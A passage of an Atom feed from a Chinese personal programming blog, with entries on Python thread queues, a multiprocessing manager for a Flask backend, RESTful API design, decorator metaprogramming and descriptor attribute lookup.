<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from queue import Queue</div><div class="line">from threading import Thread, Event</div><div class="line">def producer(out_q):</div><div class="line">    while running:</div><div class="line">        evt = Event()</div><div class="line">        out_q.put((data, event))</div><div class="line">        evt.wait()</div><div class="line">def cousumer(in_q):</div><div class="line">    while True:</div><div class="line">        data, evt = in_q.get()</div><div class="line">        evt.set()</div></pre></td></tr></table></figure>
<p>使用线程队列需要注意向队列中添加数据项并不会复制此数据项，实际上是在线程中传递对象引用。可以使用不变结构或者深拷贝。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多线程，调用子进程，生成器函数，并行计算&lt;/p&gt;
&lt;h1 id=&quot;启动和停止线程&quot;&gt;&lt;a href=&quot;#启动和停止线程&quot; class=&quot;headerlink&quot; title=&quot;启动和停止线程&quot;&gt;&lt;/a&gt;启动和停止线程&lt;/h1&gt;&lt;p&gt;threading库可以在单独的线程中执行任
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Intro to Backend 1</title>
    <link href="http://microndgt.github.io/2017/02/13/Intro-to-backend-1/"/>
    <id>http://microndgt.github.io/2017/02/13/Intro-to-backend-1/</id>
    <published>2017-02-13T04:43:57.000Z</published>
    <updated>2017-02-13T04:50:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>第一部分，Introduction to the web</p>
<p>万维网是HTML文档的集合，这些文件由HTML组成</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一部分，Introduction to the web&lt;/p&gt;
&lt;p&gt;万维网是HTML文档的集合，这些文件由HTML组成&lt;/p&gt;

    
    </summary>
    
      <category term="web" scheme="http://microndgt.github.io/categories/web/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python多进程管理</title>
    <link href="http://microndgt.github.io/2017/02/13/Python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    <id>http://microndgt.github.io/2017/02/13/Python多进程管理/</id>
    <published>2017-02-13T01:41:53.000Z</published>
    <updated>2017-02-13T03:33:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>工作上要在Flask后台调用计算包，需要进行多进程并行计算，但是要对诸多进程进行管理，于是创造了这个多进程管理，记录下来以便后来使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">class MyProcManager(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.procs = []</div><div class="line">        self.errors_flag = False</div><div class="line">        self._threads = []</div><div class="line">        self._lock = threading.Lock()</div><div class="line">    def terminate_all(self):</div><div class="line">        with self._lock:</div><div class="line">            for p in self.procs:</div><div class="line">                if p.is_alive():</div><div class="line">                    print(&quot;Terminating %s&quot; % p)</div><div class="line">                    p.terminate()</div><div class="line">        self.cleaning()</div><div class="line">    def launch_proc(self, func, args=(), kwargs=&#123;&#125;):</div><div class="line">        t = threading.Thread(target=self._proc_thread_runner,</div><div class="line">                             args=(func, args, kwargs))</div><div class="line">        self._threads.append(t)</div><div class="line">        t.start()</div><div class="line">    def _proc_thread_runner(self, func, args, kwargs):</div><div class="line">        p = multiprocessing.Process(target=func, args=args, kwargs=kwargs)</div><div class="line">        self.procs.append(p)</div><div class="line">        p.start()</div><div class="line">        while p.exitcode is None:</div><div class="line">            p.join()</div><div class="line">        if p.exitcode &gt; 0:</div><div class="line">            self.errors_flag = True</div><div class="line">            self.terminate_all()</div><div class="line">    def wait(self):</div><div class="line">        for t in self._threads:</div><div class="line">            t.join()</div><div class="line">    def cleaning(self):</div><div class="line">        self.procs = []</div><div class="line">        self.errors_flag = False</div><div class="line">        self._threads = []</div><div class="line">        self._lock = threading.Lock()</div></pre></td></tr></table></figure>
<p><code>cleaning</code>方法，因为自己在调用的时候在全局实例化了这个类，所以在每次运行完毕的时候需要重新初始化实例变量。</p>
<p>以下是调用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">t0 = time.time()</div><div class="line">for fundId in fundIds:</div><div class="line">    proc_manager.launch_proc(calc_ability_proc, args=(fundId, start_date, end_date, config))</div><div class="line">proc_manager.wait()</div><div class="line">if proc_manager.errors_flag:</div><div class="line">    return gen_response(data=None, message=&quot;some processes crashed&quot;, errorcode=1, status=&quot;error&quot;)</div><div class="line">else:</div><div class="line">    print(&quot;Everything closed cleanly&quot;)</div><div class="line">proc_manager.cleaning()</div><div class="line">t1 = time.time()</div><div class="line">print(&quot;time used: %d min&quot; % ((t1 - t0) / 60))</div></pre></td></tr></table></figure>
<p>用了10个fundId进行测试，大约比单线程快了2倍，不过应该fundId越多，速度会越快吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工作上要在Flask后台调用计算包，需要进行多进程并行计算，但是要对诸多进程进行管理，于是创造了这个多进程管理，记录下来以便后来使用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>使用Python和Flask设计RESTful API</title>
    <link href="http://microndgt.github.io/2017/02/05/%E4%BD%BF%E7%94%A8Python%E5%92%8CFlask%E8%AE%BE%E8%AE%A1RESTful-API/"/>
    <id>http://microndgt.github.io/2017/02/05/使用Python和Flask设计RESTful-API/</id>
    <published>2017-02-05T03:25:20.000Z</published>
    <updated>2017-02-05T03:03:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="REST-REpresentational-State-Transfer表现层状态迁移"><a href="#REST-REpresentational-State-Transfer表现层状态迁移" class="headerlink" title="REST(REpresentational State Transfer表现层状态迁移)"></a>REST(REpresentational State Transfer表现层状态迁移)</h1><p>web services和web APIs</p>
<ul>
<li>客户端－服务器，两者隔离</li>
<li>无状态，一种服务器不会存储客户端上一次请求的信息用来下一次使用</li>
<li>可缓存，服务器明示客户端请求能否缓存</li>
<li>分层系统，客户端和服务器通信应该以一种标准方式，中间层代替服务器做出相应，客户端不需要做任何变动</li>
<li>统一接口，通信方法必须是统一的</li>
<li>按需编码：服务器可以提供可执行代码的脚本，为客户端在它们的环境中执行</li>
</ul>
<h1 id="RESTful-的-web-service"><a href="#RESTful-的-web-service" class="headerlink" title="RESTful 的 web service"></a>RESTful 的 web service</h1><p>核心是资源，资源可以用URI表示，客户端使用HTTP协议定义的方法来发送请求到这些URIs，当然可能会导致这些被访问的资源状态改变</p>
<p><code>GET,POST,PUT,DELETE</code></p>
<p>REST设计不需要特定的数据格式，在请求中数据可以以JSON形式，或者作为url中查询参数项。</p>
<h1 id="设计一个web-service"><a href="#设计一个web-service" class="headerlink" title="设计一个web service"></a>设计一个web service</h1><p>其实就是一个标识资源被展示出来以及它们是怎样受不同的请求方法影响。</p>
<p>首先设计URL: <code>http://[hostname]/todo/api/v1.0</code>，在URL中包含应用名称有助于提供一个命名空间以便区分同一系统上的其他服务，包含版本号能够帮助以后的更新，如果新版本中存在新的和潜在不兼容的功能，可以不影响依赖于旧的功能的应用程序。</p>
<p>现在从前端过来的也就是指令信息，然后发送给服务器，计算之后返回数据信息，主要在于要将这些数据格式化成json格式，把指令从json变成python可用的。</p>
<p>有这么几项，一个是登陆，密码验证之类。另外一个是开始计算，返回数据，已完成百分比，耗费时间。另外一个是返回summary数据，输入id的话返回对应的ability或者其他数据，这块也就是数据查询功能，看查询类型了</p>
<p>擦，在虚拟环境指定Python3也是不容易啊，<code>virtualenv backend -p /usr/local/bin/python3</code>使用用户安装的python3，貌似anaconda的Python3用不了</p>
<h1 id="Flask-restful使用"><a href="#Flask-restful使用" class="headerlink" title="Flask restful使用"></a>Flask restful使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from flask import Flask</div><div class="line">from flask.ext import restful</div><div class="line"># 创建程序实例</div><div class="line">app = Flask(__name__)</div><div class="line">api = restful.Api(app)</div><div class="line"># 定义资源</div><div class="line">class HelloWorld(restful.Resource):</div><div class="line">    def get(self):</div><div class="line">        return &#123;&apos;hello&apos;: &apos;world&apos;&#125;</div><div class="line"># 添加资源</div><div class="line">api.add_resource(HelloWorld, &apos;/&apos;)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    # 开始运行</div><div class="line">    app.run(debug=True)</div></pre></td></tr></table></figure>
<h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;REST-REpresentational-State-Transfer表现层状态迁移&quot;&gt;&lt;a href=&quot;#REST-REpresentational-State-Transfer表现层状态迁移&quot; class=&quot;headerlink&quot; title=&quot;REST(R
    
    </summary>
    
      <category term="web" scheme="http://microndgt.github.io/categories/web/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python元编程</title>
    <link href="http://microndgt.github.io/2017/02/04/Python%E5%85%83%E7%BC%96%E7%A8%8B/"/>
    <id>http://microndgt.github.io/2017/02/04/Python元编程/</id>
    <published>2017-02-04T07:02:23.000Z</published>
    <updated>2017-02-05T02:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>元编程来解决高度重复的代码，元编程就是关于创建操作源代码(比如修改，生成或者包装原来的代码)的函数和类，主要技术是使用装饰器，类装饰器和元类，签名对象，使用exec()执行代码以及对内部函数和类的反射技术。</p>
<h1 id="在函数上添加包装器"><a href="#在函数上添加包装器" class="headerlink" title="在函数上添加包装器"></a>在函数上添加包装器</h1><p>使用额外的代码包装一个函数，定义一个装饰器函数，一个装饰器就是一个函数，它接受一个函数作为参数并且返回一个新的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from functools import wraps</div><div class="line">def timethis(func):</div><div class="line">    # 使用wraps的目的是为了防止函数信息变成wrapper的函数信息</div><div class="line">    @wraps(func)</div><div class="line">    def wrapper(*args, **kwargs):</div><div class="line">        start = time.time()</div><div class="line">        result = func(*args, **kwargs)</div><div class="line">        end = time.time()</div><div class="line">        print(func.__name__, end-start)</div><div class="line">        return result</div><div class="line">    return wrapper</div><div class="line">@timethis</div><div class="line">def countdown(n):</div><div class="line">    while n &gt; 0:</div><div class="line">        n -= 1</div><div class="line"># 相当于</div><div class="line">def countdown(n):</div><div class="line">    while n &gt; 0:</div><div class="line">        n -= 1</div><div class="line">countdown = timethis(countdown)</div></pre></td></tr></table></figure>
<p>所以真正执行的是装饰器函数中的闭包内部函数，使用装饰器并不会修改原始函数的参数签名以及返回值，使用<code>*args</code>和<code>**kwargs</code>的目的就是确保任何参数都能适用，而返回结果值都是调用原始函数<code>func(*args, **kwargs)</code>的返回结果。<code>@wraps(func)</code>注解是保留原始函数的元数据</p>
<h1 id="创建装饰器时保留函数元信息"><a href="#创建装饰器时保留函数元信息" class="headerlink" title="创建装饰器时保留函数元信息"></a>创建装饰器时保留函数元信息</h1><p>任何时候定义装饰器，都应该使用functools库中的<code>@wraps</code>装饰器来注解底层包装函数，这样就会复制原始函数的元信息。<code>@wraps</code>可以通过属性<code>__wrapped__</code>直接访问被包装函数，<code>countdown.__wrapped__(100000)</code></p>
<h1 id="解除一个装饰器"><a href="#解除一个装饰器" class="headerlink" title="解除一个装饰器"></a>解除一个装饰器</h1><p>如果装饰器是通过<code>@wraps</code>来实现的，那么可以访问<code>__wrapped__</code>属性来访问原始函数。</p>
<p>如果有多个包装器，那么访问<code>__wrapped__</code>属性的行为是不可预知的，而且仅仅适用于包装器正确使用了<code>@wraps</code>的情况。多个包装器，从内向外进行包装。</p>
<h1 id="定义一个带参数的装饰器"><a href="#定义一个带参数的装饰器" class="headerlink" title="定义一个带参数的装饰器"></a>定义一个带参数的装饰器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def logged(level, name=None, message=None):</div><div class="line">    def decorate(func):</div><div class="line">        logname = name if name else func.__module__</div><div class="line">        log = logging.getLogger(logname)</div><div class="line">        logmsg = message if message else func.__name__</div><div class="line">        @wraps(func)</div><div class="line">        def wrapper(*args, **kwargs):</div><div class="line">            log.log(level, logmsg)</div><div class="line">            return func(*args, **kwargs)</div><div class="line">        return wrapper</div><div class="line">    return decorate</div><div class="line">@logged(logging.DEBUG)</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div></pre></td></tr></table></figure>
<p>最外层的函数logged()接受参数并将它们作用在内部的装饰器函数上。其实就相当于下面：<code>add = logged(logging.DEBUG)(add)</code>logged()返回的是一个可调用对象，接受一个函数作为参数并且包装它。</p>
<h1 id="可自定义属性的装饰器"><a href="#可自定义属性的装饰器" class="headerlink" title="可自定义属性的装饰器"></a>可自定义属性的装饰器</h1><p>用装饰器来包装函数，并且在运行时候提供参数控制装饰器的行为。方法是，引入一个访问函数，使用nolocal来修改内部变量，然后这个访问函数被作为一个属性赋值给包装函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">def attach_wrapper(obj, func=None):</div><div class="line">    if func is None:</div><div class="line">        # 相当于将第一个参数默认了</div><div class="line">        return partial(attach_wrapper, obj)</div><div class="line">    # 这里相当于给这个对象设置了一个这个属性，后面可以直接调用</div><div class="line">    setattr(obj, func.__name__, func)</div><div class="line">    return func</div><div class="line">def logged(level, name=None, message=None):</div><div class="line">    def decorate(func):</div><div class="line">        logname = name if name else func.__module__</div><div class="line">        log = logging.getLogger(logname)</div><div class="line">        logmsg = message if message else func.__name__</div><div class="line">        @wraps(func)</div><div class="line">        def wrapper(*args, **kwargs):</div><div class="line">            log.log(level, logmsg)</div><div class="line">            return func(*args, **kwargs)</div><div class="line">        # 这里将返回的wrapper作为对象，返回了一个包涵默认对象的attach_wrapper，然后再装饰set_level，只是为该对象设置了set_level属性</div><div class="line">        @attach_wrapper(wrapper)</div><div class="line">        def set_level(newlevel):</div><div class="line">            nonlocal level</div><div class="line">            level = newlevel</div><div class="line">        @attach_wrapper(wrapper)</div><div class="line">        def set_message(newmsg):</div><div class="line">            nonlocal logmsg</div><div class="line">            logmsg = newmsg</div><div class="line">        return wrapper</div><div class="line">    return decorate</div><div class="line">@logged(logging.DEBUG)</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line">add.set_message(&apos;Add called&apos;)</div></pre></td></tr></table></figure>
<p>并且访问函数会在多层装饰器间传播</p>
<h1 id="带可选参数的装饰器"><a href="#带可选参数的装饰器" class="headerlink" title="带可选参数的装饰器"></a>带可选参数的装饰器</h1><p>一个装饰器可以不传参数，如<code>@decorator</code>，也可以传递参数给它，如<code>@decorator(x, y, z)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def logged(func=None, *, level=logging.DEBUG, name=None, message=None):</div><div class="line">    if func is None:</div><div class="line">        # 返回一个接受一个函数参数并且包装它的函数</div><div class="line">        return partial(logged, level=level, name=name, message=message)</div><div class="line">    logname = name if name else func.__module__</div><div class="line">    log = logging.getLogger(logname)</div><div class="line">    logmsg = message if message else func.__name__</div><div class="line">    @wraps(func)</div><div class="line">    def wrapper(*args, **kwargs):</div><div class="line">        log.log(level, logmsg)</div><div class="line">        return func(*args, **kwargs)</div><div class="line">    return wrapper</div><div class="line"># 不带参数，func不是None，调用类似于logged(func)</div><div class="line">@logged</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line"># 带参数，func为None，返回一个partial的函数logged,可选参数作为默认值</div><div class="line">@logged(level=logging.CRITICAL, name=&apos;example&apos;)</div><div class="line">def spam():</div><div class="line">    print(&quot;Spam!&quot;)</div></pre></td></tr></table></figure>
<p>如果定义一个所有参数都是可选的装饰器，那么使用语法糖的时候就要这样<code>@logged()</code>加上括号，否则就会出现问题。上面的第一个装饰器调用等价于<code>add = logged(add)</code>，而第2个调用等价于<code>spam = logged(level=logging.CRITICAL, name=&#39;example&#39;)(spam)</code>，使用了<code>functools.partial</code>这个技巧，它会返回一个未完全初始化的自身，除了被包装函数外其他参数都已经确定。</p>
<h1 id="将装饰器定义为类的一部分"><a href="#将装饰器定义为类的一部分" class="headerlink" title="将装饰器定义为类的一部分"></a>将装饰器定义为类的一部分</h1><p>在类中定义装饰器，并将其用在其他函数或者方法上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from functools import wraps</div><div class="line">class A:</div><div class="line">    def decorator1(self, func):</div><div class="line">        @wraps(func)</div><div class="line">        def wrapper(*args, **kwargs):</div><div class="line">            print(&quot;Decorator 1&quot;)</div><div class="line">            return func(*args, **kwrags)</div><div class="line">        return wrapper</div><div class="line">    @classmethod</div><div class="line">    def decorator2(cls, func):</div><div class="line">        @wraps(func)</div><div class="line">        def wrapper(*args, **kwargs):</div><div class="line">            print(&apos;Decorator 2&apos;)</div><div class="line">            return func(*args, **kwargs)</div><div class="line">        return wrapper</div><div class="line">a = A()</div><div class="line">@a.decorator1</div><div class="line">def spam():</div><div class="line">    pass</div><div class="line">@A.decorator2</div><div class="line">def grok():</div><div class="line">    pass</div></pre></td></tr></table></figure>
<p>一个是实例调用，一个是类调用，<code>@property</code>装饰器实际上是一个类，里面定义了三个方法，<code>getter()</code>,<code>setter()</code>,<code>deleter()</code>，每一个方法都是一个装饰器。这么定义的主要原因是各种不同的装饰器方法会在关联的property实例上操作它的状态，因此，只要需要在装饰器中记录或者绑定信息，都可以使用在类中定义装饰器的办法。</p>
<p>在类中定义装饰器对于额外参数self，cls，两个装饰器内部创建的wrapper函数并不需要这两个参数，唯一需要的时候是确实要访问包装器中这个实例的某些部分的时候。</p>
<p>涉及到继承的时候，应该这么写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">class B(A):</div><div class="line">    @A.decorator2</div><div class="line">    def bar(self):</div><div class="line">        pass</div></pre></td></tr></table></figure>
<p>装饰器被定义成类方法并且必须显式使用父类名去调用它，而不能用B，因为方法定义的时候类B还没有创建。</p>
<h1 id="将装饰器定义为类"><a href="#将装饰器定义为类" class="headerlink" title="将装饰器定义为类"></a>将装饰器定义为类</h1><p>使用一个装饰器去包装函数，但是返回一个可调用的实例，装饰器可以同时工作在类定义的内部和外部。</p>
<p>将装饰器定义成一个实例，确保其实现了<code>__call__()</code>和<code>__get__()</code>方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import types</div><div class="line">from functools import wraps</div><div class="line">class Profiled:</div><div class="line">    def __init__(self, func):</div><div class="line">        wraps(func)(self)</div><div class="line">        self.ncalls = 0</div><div class="line">    def __call__(self, *args, **kwargs):</div><div class="line">        self.ncalls += 1</div><div class="line">        return self.__wrapped__(*args, **kwargs)</div><div class="line">    def __get__(self, instance, cls):</div><div class="line">        if instance is None:</div><div class="line">            return self</div><div class="line">        else:</div><div class="line">            return types.MethodType(self, instance)</div><div class="line">@Profiled</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line">class Spam:</div><div class="line">    @Profiled</div><div class="line">    def bar(self, x):</div><div class="line">        print(self, x)</div></pre></td></tr></table></figure>
<p>这一块居然没怎么看懂，我的妈呀～</p>
<h1 id="为类方法和静态方法提供装饰器"><a href="#为类方法和静态方法提供装饰器" class="headerlink" title="为类方法和静态方法提供装饰器"></a>为类方法和静态方法提供装饰器</h1><p>确保装饰器在<code>@classmethod</code>或者<code>@staticmethod</code>之前</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class Spam:</div><div class="line">    @timethis</div><div class="line">    def instance_method(self, n):</div><div class="line">        pass</div><div class="line">    @classmethod</div><div class="line">    @timethis</div><div class="line">    def class_method(cls, n):</div><div class="line">        pass</div><div class="line">    @staticmethod</div><div class="line">    @timethis</div><div class="line">    def static_method(n):</div><div class="line">        pass</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;元编程来解决高度重复的代码，元编程就是关于创建操作源代码(比如修改，生成或者包装原来的代码)的函数和类，主要技术是使用装饰器，类装饰器和元类，签名对象，使用exec()执行代码以及对内部函数和类的反射技术。&lt;/p&gt;
&lt;h1 id=&quot;在函数上添加包装器&quot;&gt;&lt;a href=&quot;#
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
      <category term="Python_Cookbook" scheme="http://microndgt.github.io/tags/Python-Cookbook/"/>
    
  </entry>
  
  <entry>
    <title>Python类与对象2</title>
    <link href="http://microndgt.github.io/2017/02/01/Python%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A12/"/>
    <id>http://microndgt.github.io/2017/02/01/Python类与对象2/</id>
    <published>2017-02-01T04:29:49.000Z</published>
    <updated>2017-02-04T02:59:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-set-和-get-等解释"><a href="#Python-set-和-get-等解释" class="headerlink" title="Python __set__和__get__等解释"></a>Python <code>__set__</code>和<code>__get__</code>等解释</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class T:</div><div class="line">    name = &apos;name&apos;</div><div class="line">    def hello(self):</div><div class="line">        print(&apos;hello&apos;)</div><div class="line">t = T()</div></pre></td></tr></table></figure>
<p>使用<code>dir(t)</code>列出t的所有有效属性，分为两类，一类是Python自动产生的，一类是自定义的，如hello,name</p>
<p>类和实例对象，实际上Python中一切都是对象，类是type的实例，都有<code>__dict__</code>属性，里面存放他们的自定义属性</p>
<p><code>t.__dict__</code>是一个空字典，在t上没有自定义任何属性，它的有效属性hello和name都是从T得到的。查找t的name属性的时候，首先判断name属性是否是个自动产生的属性，如果是自动产生的，就按特别的方法找到这个属性，自定义的属性，从t的<code>__dict__</code>中寻找，没找到从类T中寻找,<code>T.__dict__</code>中寻找，然后返回，如果没有找到在父类中查找。</p>
<h2 id="descriptor"><a href="#descriptor" class="headerlink" title="descriptor"></a>descriptor</h2><p>查找属性的时候，如<code>obj.attr</code>，如果Python发现这个属性attr有个<code>__get__</code>方法，Python就会调用这个方法，返回这个方法的返回值，而不是attr。</p>
<p>descriptor是实现了某些特定方法的对象，<code>__get__</code>和<code>__set__</code>和<code>__delete__</code>，其中set和delete是可选的，另外描述器必须依附对象，作为对象的一个属性，而不能单独存在，描述器也必须存在类的<code>__dict__</code>中，只有在<strong><em>类</em></strong>的<code>__dict__</code>中找到属性，Python才会去看它有没有<code>__get__</code>，但是如果是实例的<code>__dict__</code>中找到的属性，那么不会去查看是否有<code>__get__</code>等方法，直接返回属性本身。</p>
<p>描述器是对象的一个属性，但是存在于类的<code>__dict__</code>中并且有特殊方法<code>__get__</code>而具有特别的功能，所以成为描述器属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">class Descriptor(object):</div><div class="line">    def __get__(self, obj, type=None):</div><div class="line">        return(&apos;get&apos;, self, obj, type, sep=&quot;, &quot;)</div><div class="line">    def __set__(self, obj, val):</div><div class="line">        print(&quot;set&quot;, self, obj, val)</div><div class="line">    def __delete__(self, obj):</div><div class="line">        print(&quot;delete&quot;, self, obj)</div></pre></td></tr></table></figure>
<p>self是当前Descriptor实例，obj值是拥有属性的对象，如果直接用类访问，那么就相当于直接用类访问类的属性，obj的值是None。type是obj的类型，如果用类访问，obj是None，那么type就是类本身。</p>
<p><code>T.d</code>返回的是<code>d.__get__(None, T)</code>，<code>t.d</code>返回的是<code>d.__get__(t, T)</code></p>
<p>如果描述器只有get方法，没有set方法，那么给这样的属性赋值的时候就会隐藏实例的描述器，直接进行赋值了。</p>
<h2 id="Python属性查找策略"><a href="#Python属性查找策略" class="headerlink" title="Python属性查找策略"></a>Python属性查找策略</h2><ul>
<li>如果attr是一个Python自动产生的属性，直接找到</li>
<li>查找类中的属性<code>obj.__class__.__dict__</code>，如果attr存在而且是描述器，那么返回描述器<code>__get__</code>方法的结果，如果没有那么继续在<code>obj.__class__</code>的父类以及祖先类中寻找描述器，如果是non-data描述器的话，就不满足要求。</li>
<li>在实例属性字典中<code>obj.__dict__</code>寻找，如果obj是普通实例，那么找到就直接返回。如果obj是类，那么在obj和它的父类，祖先类的<code>__dict__</code>中查找，如果找到描述器就返回描述器的<code>__get__</code>方法的结果，否则直接返回attr。如果没有找到，进入下一步</li>
<li>在<code>obj.__class__.__dict__</code>中查找，如果找到一个non-data描述器，返回描述器<code>__get__</code>方法的结果，找到普通属性，那么直接返回属性值。</li>
<li><code>raise AttributeError</code></li>
</ul>
<h2 id="属性赋值的查找策略"><a href="#属性赋值的查找策略" class="headerlink" title="属性赋值的查找策略"></a>属性赋值的查找策略</h2><ul>
